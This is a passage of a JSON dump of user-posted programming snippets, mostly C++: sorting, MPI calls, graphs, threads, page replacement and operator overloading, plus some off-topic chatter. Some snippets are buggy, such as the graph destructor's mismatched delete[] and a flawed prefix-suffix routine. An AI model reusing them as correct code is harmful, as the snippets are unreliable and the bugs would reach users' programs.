    "description": "//In c++14 using static_cast / const_cast:  [&best_string = static_cast<const std::string&>(best_string)](const string& s) {     best_string = s; // fails }; \n//In c++17 using std::as_const:  [&best_string = std::as_const(best_string)](const string& s) {     best_string = s; // fails }; \n",
    "reg_date": "2021-10-12T11:36:55.000Z"
  },
  {
    "id": 284,
    "keyword": null,
    "link": null,
    "title": " Largest subArray from array",
    "description": "#include <iostream> #include <vector> using namespace std;   // Function to check if subarray `A[i&hellip;j]` is formed by consecutive integers. // Here, `min` and `max` denote the minimum and maximum element in the subarray. bool isConsecutive(int A[], int i, int j, int min, int max) {     // for an array to contain consecutive integers, the difference     // between the maximum and minimum element in it should be exactly `j-i`     if (max - min != j - i) {         return false;     }       // create a visited array (we can also use a set)     vector<bool> visited(j - i + 1);       // traverse the subarray and check if each element appears only once     for (int k = i; k <= j; k++)     {         // if the element is seen before, return false         if (visited[A[k] - min]) {             return false;         }           // mark the element as seen         visited[A[k] - min] = true;     }       // we reach here when all elements in the array are distinct     return true; }   // Find the largest subarray formed by consecutive integers void findMaxSubarray(int A[], int n) {     int len = 1;     int start = 0, end = 0;       // consider each subarray formed by `A[i&hellip;j]`       // `i` denotes the beginning of the subarray     for (int i = 0; i < n - 1; i++)     {         // stores the minimum and maximum element in subarray `A[i&hellip;j]`         int min_val = A[i], max_val = A[i];           // `j` denotes the end of the subarray         for (int j = i + 1; j < n; j++)         {             // update the minimum and maximum elements of the subarray             min_val = min(min_val, A[j]);             max_val = max(max_val, A[j]);               // check if subarray `A[i&hellip;j]` is formed by consecutive integers             if (isConsecutive(A, i, j, min_val, max_val))             {                 if (len < max_val - min_val + 1)                 {                     len = max_val - min_val + 1,                     start = i, end = j;                 }             }         }     }       // print the maximum length subarray     cout << \"The largest subarray is [\" << start << \", \" << end << \"]\"; }   int main() {     int A[] = { 2, 0, 2, 1, 4, 3, 1, 0 };     int n = sizeof(A) / sizeof(A[0]);       findMaxSubarray(A, n);       return 0; }\n",
    "reg_date": "2021-10-12T11:36:55.000Z"
  },
  {
    "id": 285,
    "keyword": null,
    "link": null,
    "title": " Longest prefix which is also suffix",
    "description": "// CPP program to find length of the longest  // prefix which is also suffix  #include <bits/stdc++.h>  using namespace std;     // Function to find largest prefix which is also a suffix  int largest_prefix_suffix(const std::string &str) {         int n = str.length();         if(n < 2) {      return 0;    }       int len = 0;    int i = n/2;         while(i < n) {      if(str[i] == str[len]) {        ++len;        ++i;      } else {        if(len == 0) { // no prefix          ++i;        } else { // search for shorter prefixes          --len;        }      }    }         return len;     }     // Driver code  int main() {         string s = \"blablabla\";     cout << largest_prefix_suffix(s);     return 0;  }  \n",
    "reg_date": "2021-10-12T11:36:55.000Z"
  },
  {
    "id": 286,
    "keyword": null,
    "link": null,
    "title": " Lucas numbers",
    "description": "/*Program to print the Lucas series for n terms.*/  #include <iostream> using namespace std;  int main() { \tint n, i, t1 = 2, t2 = 1, tn; \tcout << \"Enter the number of terms desired in the lucas series: \"; \tcin >> n; \t \tif (n == 1) \t\tcout << endl << 2 << endl; \telse if (n == 2) \t\tcout << endl << 2 << endl << 1 << endl; \telse if (n > 2) \t{ \t\tcout <<endl<<\"Lucas series for \"<< n<< \" terms is:\"<<endl<< t1 << endl << t2 << endl; \t\tfor (i = 0; i < n-2; i++) \t\t{ \t\t\ttn = t1 + t2; \t\t\tcout << tn << endl; \t\t\tt1 = t2; \t\t\tt2 = tn;  \t\t} \t}  \treturn 0; } \n",
    "reg_date": "2021-10-12T11:36:55.000Z"
  },
  {
    "id": 287,
    "keyword": null,
    "link": null,
    "title": " MPI File seek",
    "description": "int MPI_File_seek(MPI_File fh, MPI_Offset offset, int whence) //Input Parameters //fh //file handle (handle) //offset //file offset (integer) //whence //update mode (state)\n",
    "reg_date": "2021-10-12T11:36:55.000Z"
  },
  {
    "id": 288,
    "keyword": null,
    "link": null,
    "title": " MPI PUT",
    "description": "MPI_Put(void *origin_addr, int origin_count, MPI_Datatype origin_dtype,         int target_rank, MPI_A int target_disp, int target_count,         MPI_Datatype target_dtype, MPI_Winwin) //Put data into a memory window on a remote process\n",
    "reg_date": "2021-10-12T11:36:56.000Z"
  },
  {
    "id": 289,
    "keyword": null,
    "link": null,
    "title": " MPI SEND",
    "description": "//MPI_Send - Performs a standard-mode blocking send. int MPI_Send(const void *buf, int count, MPI_Datatype datatype, int dest,     int tag, MPI_Comm comm) /* buf Initial address of send buffer (choice). count Number of elements send (nonnegative integer). datatype Datatype of each send buffer element (handle). dest Rank of destination (integer). tag Message tag (integer). comm Communicator (handle). */\n",
    "reg_date": "2021-10-12T11:36:56.000Z"
  },
  {
    "id": 290,
    "keyword": null,
    "link": null,
    "title": " MPI Sendrecv",
    "description": "MPI_Sendrecv(void *sendbuf, int sendcount, MPI_Datatype sendtype,              int dest,int sendtag, void *recvbuf, int recvcount,              MPI_Datatype recvtype, int source, int recvtag,              MPI_Comm comm, MPI_Status *status);\n",
    "reg_date": "2021-10-12T11:36:56.000Z"
  },
  {
    "id": 291,
    "keyword": null,
    "link": null,
    "title": " MPI file open",
    "description": "#include <mpi.h> int MPI_File_open(MPI_Comm comm, const char *filename,     int amode, MPI_Info info,     MPI_File *fh)  //MPI_File_open opens the file identified by the filename filename on all   //processes in the comm communicator group.    //MPI_File_open is a collective routine;    //all processes must provide the same value for amode,    //and all processes must provide filenames that reference the same file    //which are textually identical\n",
    "reg_date": "2021-10-12T11:36:56.000Z"
  },
  {
    "id": 292,
    "keyword": null,
    "link": null,
    "title": " MPI wait",
    "description": "int MPI_Waitall(int count, MPI_Request array_of_requests[],                 MPI_Status array_of_statuses[])\n",
    "reg_date": "2021-10-12T11:36:56.000Z"
  },
  {
    "id": 293,
    "keyword": null,
    "link": null,
    "title": " Match regex",
    "description": "",
    "reg_date": "2021-10-12T11:36:56.000Z"
  },
  {
    "id": 294,
    "keyword": null,
    "link": null,
    "title": " Max element in an array with the index in c++",
    "description": "int main(int argc, char** argv) {   int A[4] = {0, 2, 3, 1};   const int N = sizeof(A) / sizeof(int);    cout << \"Index of max element: \"        << distance(A, max_element(A, A + N))        << endl;    return 0; } \n",
    "reg_date": "2021-10-12T11:36:56.000Z"
  },
  {
    "id": 295,
    "keyword": null,
    "link": null,
    "title": " Memset function in C++",
    "description": "#include <cstring> memset(a, 0, sizeof(a));\nmemset(a, 0, sizeof(a))  memset(str, '#', sizeof(str)); \n/* memset example */ #include <stdio.h> #include <string.h>  int main () {   char str[] = \"almost every programmer should know memset!\";   memset (str,'-',6);   puts (str);   return 0; }  Output: ------ every programmer should know memset!\n/* memset example */ #include <stdio.h> #include <string.h>  int main () {   char str[] = \"almost every programmer should know memset!\";   memset (str,'-',6);   puts (str);   return 0; }\nasdad\n",
    "reg_date": "2021-10-12T11:36:56.000Z"
  },
  {
    "id": 296,
    "keyword": null,
    "link": null,
    "title": " Merge sort in c++",
    "description": "#include <iostream> using namespace std;    void merge(int arr[], int l, int m, int r) {     int n1 = m - l + 1;     int n2 = r - m;         int L[n1], R[n2];           for (int i = 0; i < n1; i++)         L[i] = arr[l + i];     for (int j = 0; j < n2; j++)         R[j] = arr[m + 1 + j];        int i = 0;            int j = 0;            int k = l;       while (i < n1 && j < n2) {         if (L[i] <= R[j]) {             arr[k] = L[i];             i++;         }         else {             arr[k] = R[j];             j++;         }         k++;     }          while (i < n1) {         arr[k] = L[i];         i++;         k++;     }           while (j < n2) {         arr[k] = R[j];         j++;         k++;     } }    void mergeSort(int arr[],int l,int r){     if(l>=r){         return;     }     int m = (l+r-1)/2;     mergeSort(arr,l,m);     mergeSort(arr,m+1,r);     merge(arr,l,m,r); }    void printArray(int A[], int size) {     for (int i = 0; i < size; i++)         cout << A[i] << \" \"; }    int main() {     int arr[] = { 12, 11, 13, 5, 6, 7 };     int arr_size = sizeof(arr) / sizeof(arr[0]);       cout << \"Given array is \\n\";     printArray(arr, arr_size);       mergeSort(arr, 0, arr_size - 1);       cout << \"\\nSorted array is \\n\";     printArray(arr, arr_size);     return 0; }\n// @see https://www.youtube.com/watch?v=es2T6KY45cA&vl=en // @see https://www.cs.usfca.edu/~galles/visualization/ComparisonSort.html  function merge(list, start, midpoint, end) {     const left = list.slice(start, midpoint);     const right = list.slice(midpoint, end);     for (let topLeft = 0, topRight = 0, i = start; i < end; i += 1) {         if (topLeft >= left.length) {             list[i] = right[topRight++];         } else if (topRight >= right.length) {             list[i] = left[topLeft++];         } else if (left[topLeft] < right[topRight]) {             list[i] = left[topLeft++];         } else {             list[i] = right[topRight++];         }     } }  function mergesort(list, start = 0, end = undefined) {     if (end === undefined) {         end = list.length;     }     if (end - start > 1) {         const midpoint = ((end + start) / 2) >> 0;         mergesort(list, start, midpoint);         mergesort(list, midpoint, end);         merge(list, start, midpoint, end);     }     return list; }  mergesort([4, 7, 2, 6, 4, 1, 8, 3]);\n#include<iostream> using namespace std; void swapping(int &a, int &b) {     //swap the content of a and b    int temp;    temp = a;    a = b;    b = temp; } void display(int *array, int size) {    for(int i = 0; i<size; i++)       cout << array[i] << \" \";    cout << endl; } void merge(int *array, int l, int m, int r) {    int i, j, k, nl, nr;    //size of left and right sub-arrays    nl = m-l+1; nr = r-m;    int larr[nl], rarr[nr];    //fill left and right sub-arrays    for(i = 0; i<nl; i++)       larr[i] = array[l+i];    for(j = 0; j<nr; j++)       rarr[j] = array[m+1+j];    i = 0; j = 0; k = l;    //marge temp arrays to real array    while(i < nl && j<nr) {       if(larr[i] <= rarr[j]) {          array[k] = larr[i];          i++;       }else{          array[k] = rarr[j];          j++;       }       k++;    }    while(i<nl) {       //extra element in left array       array[k] = larr[i];       i++; k++;    }    while(j<nr) {     //extra element in right array       array[k] = rarr[j];       j++; k++;    } } void mergeSort(int *array, int l, int r) {    int m;    if(l < r) {       int m = l+(r-l)/2;       // Sort first and second arrays       mergeSort(array, l, m);       mergeSort(array, m+1, r);       merge(array, l, m, r);    } } int main() {    int n;    cout << \"Enter the number of elements: \";    cin >> n;    int arr[n];     //create an array with given number of elements    cout << \"Enter elements:\" << endl;    for(int i = 0; i<n; i++) {       cin >> arr[i];    }    cout << \"Array before Sorting: \";    display(arr, n);    mergeSort(arr, 0, n-1);     //(n-1) for last index    cout << \"Array after Sorting: \";    display(arr, n); }\n/*       a[] is the array, p is starting index, that is 0,      and r is the last index of array.  */  #include <stdio.h>  // lets take a[5] = {32, 45, 67, 2, 7} as the array to be sorted.  // merge sort function void mergeSort(int a[], int p, int r) {     int q;     if(p < r)     {         q = (p + r) / 2;         mergeSort(a, p, q);         mergeSort(a, q+1, r);         merge(a, p, q, r);     } }  // function to merge the subarrays void merge(int a[], int p, int q, int r) {     int b[5];   //same size of a[]     int i, j, k;     k = 0;     i = p;     j = q + 1;     while(i <= q && j <= r)     {         if(a[i] < a[j])         {             b[k++] = a[i++];    // same as b[k]=a[i]; k++; i++;         }         else         {             b[k++] = a[j++];         }     }        while(i <= q)     {         b[k++] = a[i++];     }        while(j <= r)     {         b[k++] = a[j++];     }        for(i=r; i >= p; i--)     {         a[i] = b[--k];  // copying back the sorted list to a[]     }  }  // function to print the array void printArray(int a[], int size) {     int i;     for (i=0; i < size; i++)     {         printf(\"%d \", a[i]);     }     printf(\"\\n\"); }   int main() {     int arr[] = {32, 45, 67, 2, 7};     int len = sizeof(arr)/sizeof(arr[0]);       printf(\"Given array: \\n\");     printArray(arr, len);          // calling merge sort     mergeSort(arr, 0, len - 1);       printf(\"\\nSorted array: \\n\");     printArray(arr, len);     return 0; }\n// Merge two subarrays L and M into arr void merge(int arr[], int p, int q, int r) {      // Create L &larr; A[p..q] and M &larr; A[q+1..r]     int n1 = q - p + 1;     int n2 = r - q;      int L[n1], M[n2];      for (int i = 0; i < n1; i++)         L[i] = arr[p + i];     for (int j = 0; j < n2; j++)         M[j] = arr[q + 1 + j];      // Maintain current index of sub-arrays and main array     int i, j, k;     i = 0;     j = 0;     k = p;      // Until we reach either end of either L or M, pick larger among     // elements L and M and place them in the correct position at A[p..r]     while (i < n1 && j < n2) {         if (L[i] <= M[j]) {             arr[k] = L[i];             i++;         } else {             arr[k] = M[j];             j++;         }         k++;     }      // When we run out of elements in either L or M,     // pick up the remaining elements and put in A[p..r]     while (i < n1) {         arr[k] = L[i];         i++;         k++;     }      while (j < n2) {         arr[k] = M[j];         j++;         k++;     } }\n#include \"tools.hpp\" /*   >>>>>>>> (Recursive function that sorts a sequence of) <<<<<<<<<<<<       >>>>>>>> (numbers in ascending order using the merge function) <<<<                                 */ std::vector<int> sort(size_t start, size_t length, const std::vector<int>& vec) { \tif(vec.size()==0 ||vec.size() == 1) \treturn vec;  \tvector<int> left,right; //===>  creating left and right vectors   \tsize_t mid_point = vec.size()/2; //===>   midle point between the left vector and the right vector   \tfor(int i = 0 ; i < mid_point; ++i){left.emplace_back(vec[i]);} //===>  left vector  \tfor(int j = mid_point; j < length; ++j){ right.emplace_back(vec[j]);} //===>  right vector   \tleft = sort(start,mid_point,left); //===>  sorting the left vector  \tright = sort(mid_point,length-mid_point,right);//===>  sorting the right vector  \t  \treturn merge(left,right); //===>   all the function merge to merge between the left and the right } /*  >>>>> (function that merges two sorted vectors of numberss) <<<<<<<<<                                    */  vector<int> merge(const vector<int>& a, const vector<int>& b) { \tvector<int> merged_a_b(a.size()+b.size(),0); // temp vector that includes both left and right vectors \tint i = 0; \tint j = 0; \tint k = 0; \tint left_size = a.size(); \tint right_size = b.size(); \twhile(i<left_size && j<right_size)  \t{ \t\tif(a[i]<b[j]) \t\t{ \t\t\tmerged_a_b[k]=a[i]; \t\t\ti++; \t\t} \t\telse \t\t{ \t\t\tmerged_a_b[k]=b[j]; \t\t\tj++; \t\t} \t\tk++; \t} \twhile(i<left_size) \t{ \t\tmerged_a_b[k]=a[i]; \t\ti++; \t\tk++; \t} \twhile(j<right_size) \t{ \t\tmerged_a_b[k]=b[j]; \t\tj++; \t\tk++; \t} \t \treturn merged_a_b;  }\n",
    "reg_date": "2021-10-12T11:36:56.000Z"
  },
  {
    "id": 297,
    "keyword": null,
    "link": null,
    "title": " Missionaries and cannibals problem solution in C++",
    "description": "  // missionaries and cannibals #include<iostream> #include<iomanip> using namespace std; class game{ public: int counto, i; char left[6], right[6]; int m_num, c_num; bool side; int ml_count, cl_count; int mr_count, cr_count; game(){ counto = 1; ml_count = cl_count = 3; mr_count = cr_count = 0; side = false; for (i = 0; i<3; i++){ left[i] = 'M'; left[i + 3] = 'C'; right[i] = ' '; right[i + 3] = ' '; } } void get(){ start: cout << \"\\nEnter no.of missionaries= \"; cin >> m_num; cout << \"\\nEnter no.of cannibals= \"; cin >> c_num; if (m_num>3 || c_num>3 || m_num<0 || c_num<0) goto start; else if ((m_num + c_num)>2 || (m_num + c_num == 0)) goto start; } void displaymc(){ cout << \"\\nleft side\\tright side\\n\"; for (i = 0; i<3; i++) cout << left[i] << \" \"; cout << \"\\t\\t\"; for (i = 0; i<3; i++) cout << right[i] << \" \"; cout << endl; for (i = 3; i<6; i++) cout << left[i] << \" \"; cout << \"\\t\\t\"; for (i = 3; i<6; i++) cout << right[i] << \" \"; cout << endl; if (counto % 2 == 0){ side = true; cout << \"\\nBoat on right side of river\\n\"; } else{ side = false; cout << \"\\nBoat on left side of river\\n\"; } } void boat_lr(){ for (i = 0; i<m_num; i++){ if (left[0] == 'M'){ left[0] = ' '; right[0] = 'M'; ml_count -= 1; mr_count += 1; } else if (left[1] == 'M'){ left[1] = ' '; right[1] = 'M'; ml_count -= 1; mr_count += 1; } else if (left[2] == 'M'){ left[2] = ' '; right[2] = 'M'; ml_count -= 1; mr_count += 1; } } for (i = 0; i<c_num; i++){ if (left[3] == 'C'){ left[3] = ' '; right[3] = 'C'; cl_count -= 1; cr_count += 1; } else if (left[4] == 'C'){ left[4] = ' '; right[4] = 'C'; cl_count -= 1; cr_count += 1; } else if (left[5] == 'C'){ left[5] = ' '; right[5] = 'C'; cl_count -= 1; cr_count += 1; } } } void boat_rl(){ for (i = 0; i<m_num; i++){ if (right[0] == 'M'){ right[0] = ' '; left[0] = 'M'; ml_count += 1; mr_count -= 1; } else if (right[1] == 'M'){ right[1] = ' '; left[1] = 'M'; ml_count += 1; mr_count -= 1; } else if (right[2] == 'M'){ right[2] = ' '; left[2] = 'M'; ml_count += 1; mr_count -= 1; } } for (i = 0; i<c_num; i++){ if (right[3] == 'C'){ right[3] = ' '; left[3] = 'C'; cl_count += 1; cr_count -= 1; } else if (right[4] == 'C'){ right[4] = ' '; left[4] = 'C'; cl_count += 1; cr_count -= 1; } else if (right[5] == 'C'){ right[5] = ' '; left[5] = 'C'; cl_count += 1; cr_count -= 1; } } } }; int main(){ game g; while (true){ if (g.ml_count<g.cl_count && g.ml_count>0 || g.mr_count<g.cr_count && g.mr_count>0){ cout << \"\\n\\n~~~~~~~~~~~~~~~~YOU LOST!!~~~~~~~~~~~~~~~~\\n\"; break; } else if (g.cr_count == g.mr_count && g.cr_count == 3 && g.mr_count == 3){ cout << \"\\n\\n~~~~~~~~~~~~~~~~YOU WON!!~~~~~~~~~~~~~~~~\\n\"; break; } else{ g.displaymc(); g.get(); if (g.side == false) g.boat_lr(); else g.boat_rl(); } g.counto++; } return 0; } \n",
    "reg_date": "2021-10-12T11:36:57.000Z"
  },
  {
    "id": 298,
    "keyword": null,
    "link": null,
    "title": " Mod in c++",
    "description": "if (iNum % 2 == 0)  { cout << num << \" is even \"; } // % is used to mod numbers \n#include <iostream> using namespace std;  int main() { \tcout << 11%3; // Prints 2 }\n",
    "reg_date": "2021-10-12T11:36:57.000Z"
  },
  {
    "id": 299,
    "keyword": null,
    "link": null,
    "title": " Modulo Exponentiaon,Iteratve Modulo Exponentiation",
    "description": "long long binpow(long long a, long long b, long long m) {     a %= m;     long long res = 1;     while (b > 0) {         if (b & 1)             res = res * a % m;         a = a * a % m;         b >>= 1;     }     return res; } \n",
    "reg_date": "2021-10-12T11:36:57.000Z"
  },
  {
    "id": 300,
    "keyword": null,
    "link": null,
    "title": " Name one example of a “decider” program that you regularly encounter in real life.",
    "description": "how come\n",
    "reg_date": "2021-10-12T11:36:57.000Z"
  },
  {
    "id": 301,
    "keyword": null,
    "link": null,
    "title": " New Year's Eve",
    "description": "Happy New Year my grepper friends!!!\nCheers to a New Year Grepper Community!!  \nif is \"12/31/2020\":   print(\"HAPPY NEW YEARS EVE!\")\nWOOOOOOO! Cheers to a New Year!!\nDon't miss clicking on the ICON right of this screen! Wohuuuuuu!\nHappy New Year! Goodbye 2020!\nOMG ! CANT WAIT FOR 2021!!!\nYo coders, happy 2021... Let's make it fantastic !\nSystem.out.print(\"Happy new  year\");\nGood Bye 2020,Hey Wassup? 2021\n",
    "reg_date": "2021-10-12T11:36:57.000Z"
  },
  {
    "id": 302,
    "keyword": null,
    "link": null,
    "title": " Non-type template arguments",
    "description": "// template arguments #include <iostream> using namespace std;  template <class T, int N> T fixed_multiply (T val) {   return val * N; }  int main() {   std::cout << fixed_multiply<int,2>(10) << '\\n';   std::cout << fixed_multiply<int,3>(10) << '\\n'; }\n",
    "reg_date": "2021-10-12T11:36:58.000Z"
  },
  {
    "id": 303,
    "keyword": null,
    "link": null,
    "title": " Not c++",
    "description": "#include<iostream> using namespace std; int main(){ \tint a;     cin>>a;     if(!((a >= 20 && a <= 30) || (a > 0 && a < 10))){     \tcout<<\"Dentro!\";    \t}    \telse{ \t\tcout<<\"Fuori!\"; \t} }\n",
    "reg_date": "2021-10-12T11:36:58.000Z"
  },
  {
    "id": 304,
    "keyword": null,
    "link": null,
    "title": " OPA in expanse",
    "description": "Outer Planets Alliance The Outer Planets Alliance (OPA) is a loosely affiliated network borrowing or associating under a core common ideology that started its life as a labor union or advocacy group, fighting for the interests of inhabitants of the Belt, often in direct conflict with the inner planets' Earth-Mars Coalition Navy.\n",
    "reg_date": "2021-10-12T11:36:58.000Z"
  },
  {
    "id": 305,
    "keyword": null,
    "link": null,
    "title": " OpenService FAILED 1060",
    "description": "PS C:\\WINDOWS\\system32> & cmd /c sc start secdrv.sys [SC] StartService: OpenService FAILED 1060:  The specified service does not exist as an installed service.  PS C:\\WINDOWS\\system32> \n",
    "reg_date": "2021-10-12T11:36:58.000Z"
  },
  {
    "id": 306,
    "keyword": null,
    "link": null,
    "title": " Open a Short Position MQL5",
    "description": "// 5th transition procedures of the &laquo;Position handling&raquo; subsystem: open a short position  mrequest.action = TRADE_ACTION_DEAL;                                  // market sell  mrequest.price = NormalizeDouble(latest_price.bid,_Digits);           // latest bid price  mrequest.sl = NormalizeDouble(latest_price.ask + STP*_Point,_Digits);  // place a Stop Loss  mrequest.tp = NormalizeDouble(latest_price.ask - TKP*_Point,_Digits);  // place a Take Profit  mrequest.symbol = _Symbol;                                          // symbol  mrequest.volume = Lot;                                             // lots  mrequest.magic = EA_Magic;                                         // Magic Number  mrequest.type= ORDER_TYPE_SELL;                                      // sell order  mrequest.type_filling = ORDER_FILLING_FOK;                           // in the specified volume and for a price,                                                                                // equal or better, than specified in the order  mrequest.deviation=100;                                             // slippage  OrderSend(mrequest,mresult);  if(mresult.retcode==10009 || mresult.retcode==10008) // request is complete or the order is placed     {      Alert(\"A sell order placed, ticket #:\",mresult.order);     }  else     {      Alert(\"A sell order is not placed; error:\",GetLastError());      return;     }\n",
    "reg_date": "2021-10-12T11:36:58.000Z"
  },
  {
    "id": 307,
    "keyword": null,
    "link": null,
    "title": " Optimal Page Replacement Algorithm",
    "description": "#include<stdio.h>   int main() {     int no_of_frames, no_of_pages, frames[10], pages[30], temp[10], flag1, flag2, flag3, i, j, k, pos, max, faults = 0;     printf(\"Enter number of frames: \");     scanf(\"%d\", &no_of_frames);          printf(\"Enter number of pages: \");     scanf(\"%d\", &no_of_pages);          printf(\"Enter page reference string: \");          for(i = 0; i < no_of_pages; ++i){         scanf(\"%d\", &pages[i]);     }          for(i = 0; i < no_of_frames; ++i){         frames[i] = -1;     }          for(i = 0; i < no_of_pages; ++i){         flag1 = flag2 = 0;                  for(j = 0; j < no_of_frames; ++j){             if(frames[j] == pages[i]){                    flag1 = flag2 = 1;                    break;                }         }                  if(flag1 == 0){             for(j = 0; j < no_of_frames; ++j){                 if(frames[j] == -1){                     faults++;                     frames[j] = pages[i];                     flag2 = 1;                     break;                 }             }             }                  if(flag2 == 0){         \tflag3 =0;         \t             for(j = 0; j < no_of_frames; ++j){             \ttemp[j] = -1;             \t             \tfor(k = i + 1; k < no_of_pages; ++k){             \t\tif(frames[j] == pages[k]){             \t\t\ttemp[j] = k;             \t\t\tbreak;             \t\t}             \t}             }                          for(j = 0; j < no_of_frames; ++j){             \tif(temp[j] == -1){             \t\tpos = j;             \t\tflag3 = 1;             \t\tbreak;             \t}             }                          if(flag3 ==0){             \tmax = temp[0];             \tpos = 0;             \t             \tfor(j = 1; j < no_of_frames; ++j){             \t\tif(temp[j] > max){             \t\t\tmax = temp[j];             \t\t\tpos = j;             \t\t}             \t}            \t             } \t\t\t \t\t\tframes[pos] = pages[i]; \t\t\tfaults++;         }                  printf(\"\\n\");                  for(j = 0; j < no_of_frames; ++j){             printf(\"%d\\t\", frames[j]);         }     }          printf(\"\\n\\nTotal Page Faults = %d\", faults);          return 0; } \n#include <bits/stdc++.h> using namespace std; int predict(int page[], vector<int>& fr, int pn, int index) {    // Store the index of pages which are going    // to be used recently in future    int res = -1, farthest = index;    for (int i = 0; i < fr.size(); i++) {       int j;       for (j = index; j < pn; j++) {          if (fr[i] == page[j]) {             if (j > farthest) {                farthest = j;                res = i;             }             break;          }       }       // Return the page which are       // are never referenced in future,       if (j == pn)          return i;    }    // If all of the frames were not in future,    // return any of them, we return 0. Otherwise    // we return res.    return (res == -1) ? 0 : res; } bool search(int key, vector<int>& fr) {    for (int i = 0; i < fr.size(); i++)    if (fr[i] == key)    return true;    return false; } void opr(int page[], int pn, int fn) {    vector<int> fr;    int hit = 0;    for (int i = 0; i < pn; i++) {       // Page found in a frame : HIT       if (search(page[i], fr)) {          hit++;          continue;       }       //If a page not found in a frame : MISS         // check if there is space available in frames.       if (fr.size() < fn)       fr.push_back(page[i]);       // Find the page to be replaced.       else {          int j = predict(page, fr, pn, i + 1);          fr[j] = page[i];       }    }    cout << \"Hits = \" << hit << endl;    cout << \"Misses = \" << pn - hit << endl; } // main Function int main() {    int page[] = { 1, 7, 8, 3, 0, 2, 0, 3, 5, 4, 0, 6, 1 };    int pn = sizeof(page) / sizeof(page[0]);    int fn = 3;    opr(page, pn, fn);    return 0; }\nInput : Number of frames, fn = 3         Reference String, pg[] = {1,2,3,4,2,1,5,6,2,1,2,3,7,6,3,2,1,2,3,6}; Output : No. of hits = 11           No. of misses = 9  Input : Number of frames, fn = 4          Reference String, pg[] = {7, 0, 1, 2,                    0, 3, 0, 4, 2, 3, 0, 3, 2}; Output : No. of hits = 7          No. of misses = 6 \n",
    "reg_date": "2021-10-12T11:36:58.000Z"
  },
  {
    "id": 308,
    "keyword": null,
    "link": null,
    "title": " Oriented and unoriented graphs C++",
    "description": "#include <iostream> using namespace std; // stores adjacency list items struct adjNode {     int val, cost;     adjNode* next; }; // structure to store edges struct graphEdge {     int start_ver, end_ver, weight; }; class DiaGraph{     // insert new nodes into adjacency list from given graph     adjNode* getAdjListNode(int value, int weight, adjNode* head)   {         adjNode* newNode = new adjNode;         newNode->val = value;         newNode->cost = weight;                   newNode->next = head;   // point new node to current head         return newNode;     }     int N;  // number of nodes in the graph public:     adjNode **head;                //adjacency list as array of pointers     // Constructor     DiaGraph(graphEdge edges[], int n, int N)  {         // allocate new node         head = new adjNode*[N]();         this->N = N;         // initialize head pointer for all vertices         for (int i = 0; i < N; ++i)             head[i] = nullptr;         // construct directed graph by adding edges to it         for (unsigned i = 0; i < n; i++)  {             int start_ver = edges[i].start_ver;             int end_ver = edges[i].end_ver;             int weight = edges[i].weight;             // insert in the beginning             adjNode* newNode = getAdjListNode(end_ver, weight, head[start_ver]);                                       // point head pointer to new node             head[start_ver] = newNode;              }     }       // Destructor      ~DiaGraph() {     for (int i = 0; i < N; i++)         delete[] head[i];         delete[] head;      } }; // print all adjacent vertices of given vertex void display_AdjList(adjNode* ptr, int i) {     while (ptr != nullptr) {         cout << \"(\" << i << \", \" << ptr->val             << \", \" << ptr->cost << \") \";         ptr = ptr->next;     }     cout << endl; } // graph implementation int main() {     // graph edges array.     graphEdge edges[] = {         // (x, y, w) -> edge from x to y with weight w         {0,1,2},{0,2,4},{1,4,3},{2,3,2},{3,1,4},{4,3,3}     };     int N = 6;      // Number of vertices in the graph     // calculate number of edges     int n = sizeof(edges)/sizeof(edges[0]);     // construct graph     DiaGraph diagraph(edges, n, N);     // print adjacency list representation of graph     cout<<\"Graph adjacency list \"<<endl<<\"(start_vertex, end_vertex, weight):\"<<endl;     for (int i = 0; i < N; i++)     {         // display adjacent vertices of vertex i         display_AdjList(diagraph.head[i], i);     }     return 0; } \n",
    "reg_date": "2021-10-12T11:36:58.000Z"
  },
  {
    "id": 309,
    "keyword": null,
    "link": null,
    "title": " Overloading IO Stream",
    "description": "//Overloading C++ Stream , Extraction Operator| C++ Programming #include <bits/stdc++.h> using namespace std; class Person {     string name;     int age;  public:     Person()     {         this->name = \"No nmae\";         this->age = 0;     }      friend ostream &operator<<(ostream &output, Person &p);     friend istream &operator>>(istream &input, Person &p); };  ostream &operator<<(ostream &output, Person &p) {     output << \"What the devil \" << endl;     output << \"My name is \" << p.name << \" and My age is \" << p.age << endl;     return output; } istream &operator>>(istream &input, Person &p) {     input >> p.name >> p.age;     return input; }  int main() {     cout << \"Enter the name and age \" << endl;     Person ak;     cin >> ak;     cout << ak;     return 0; }\n",
    "reg_date": "2021-10-12T11:36:58.000Z"
  },
  {
    "id": 310,
    "keyword": null,
    "link": null,
    "title": " Overloading euqals to operator in C++",
    "description": "bool Complex::operator==(const Complex c1){   if(real == c1.real && imag == c1.imag){     return true;   }   else   return false; }\n",
    "reg_date": "2021-10-12T11:36:58.000Z"
  },
  {
    "id": 311,
    "keyword": null,
    "link": null,
    "title": " PI IN C++ WITH CMATH",
    "description": "#include <iostream> #include <cmath> using namespace std; float area(int radius) {    return M_PI * (radius * radius); } int main () {    cout << \"Area of a circle with radius 7 unit is: \" << area(7); }\n",
    "reg_date": "2021-10-12T11:36:58.000Z"
  },
  {
    "id": 312,
    "keyword": null,
    "link": null,
    "title": " PRINT IN C ++",
    "description": "std::cout << \" Something \";\n#include <iostream> std::cout << someString << \"\\n\"; \n",
    "reg_date": "2021-10-12T11:36:59.000Z"
  },
  {
    "id": 313,
    "keyword": null,
    "link": null,
    "title": " PThreads c++ Example",
    "description": "#include <iostream> #include <cstdlib> #include <pthread.h>  using namespace std;  #define NUM_THREADS 5  void *PrintHello(void *threadid) {    long tid;    tid = (long)threadid;    cout << \"Hello World! Thread ID, \" << tid << endl;    pthread_exit(NULL); }  int main () {    pthread_t threads[NUM_THREADS];    int rc;    int i;        for( i = 0; i < NUM_THREADS; i++ ) {       cout << \"main() : creating thread, \" << i << endl;       rc = pthread_create(&threads[i], NULL, PrintHello, (void *)i);              if (rc) {          cout << \"Error:unable to create thread,\" << rc << endl;          exit(-1);       }    }    pthread_exit(NULL); }\n",
    "reg_date": "2021-10-12T11:36:59.000Z"
  },
  {
    "id": 314,
    "keyword": null,
    "link": null,
    "title": " PUBG APIKEY=<your-api-key> npm t",
